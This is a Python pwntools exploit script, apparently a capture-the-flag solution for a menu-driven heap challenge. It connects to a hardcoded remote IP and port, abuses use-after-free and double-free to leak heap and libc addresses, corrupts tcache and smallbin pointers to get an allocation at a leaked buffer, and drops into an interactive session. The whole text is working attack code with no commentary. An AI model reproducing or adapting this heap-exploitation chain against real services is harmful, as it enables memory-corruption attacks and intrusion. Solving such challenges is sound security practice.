#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

def menu(idx):
  p.sendlineafter('4: Enjoy scenery', str(idx))

def add(Size):
  menu(1)
  p.sendlineafter('size:', str(Size))

def delete(idx):
  menu(2)
  p.sendlineafter('idx:', str(idx))

def edit(idx, payload):
  menu(3)
  p.sendlineafter('idx:', str(idx))
  p.sendafter('chat:', payload)

def show(idx):
  menu(4)
  p.sendlineafter('idx:', str(idx))

# p = process('./pwn')
p = remote('112.126.71.170', 43652)
 
if __name__ == "__main__":
  p.recvuntil('A gift from ChangChun People\n')
  buf = int(p.recvline()[:-1], 16)
  success(str(hex(buf)))

  add(0x100)
  add(0x80)
  delete(1)
  add(0x100)
  add(0x80)
  delete(0)
  edit(0, 'a' * 0x10 + '\n')
  delete(0)
  show(0)
  p.recvuntil('see\n')
  heap = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x2a0
  success('HEAP:\t' + str(hex(heap)))
  edit(0, p64(0) * 2 + '\n')

  for i in range(5):
    delete(0)
    edit(0, p64(heap + 0x2a0) * 2 + '\n')

  delete(0)
  show(0)
  p.recvuntil('see\n')
  main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 96
  __malloc_hook = main_arena - 0x10
  libc = __malloc_hook - 0x1ebb70
  smallbins = main_arena + 624

  delete(1)

  menu(666)
  menu(5)
  p.sendline(p64(main_arena + 352) + p64(heap + 0x430))


  payload = p64(heap + 0x290) + p64(buf - 0x10)
  edit(1, payload + '\n')

  delete(2)
  add(0x100)

  edit(0, p64(main_arena + 352) + '\n')
  

  success('HEAP:\t' + str(hex(heap)))
  success('MMAP:\t' + str(hex(buf)))
  success('LIBC:\t' + str(hex(libc)))
  success('BINS:\t' + str(hex(smallbins)))

  # gdb.attach(p)
  p.interactive()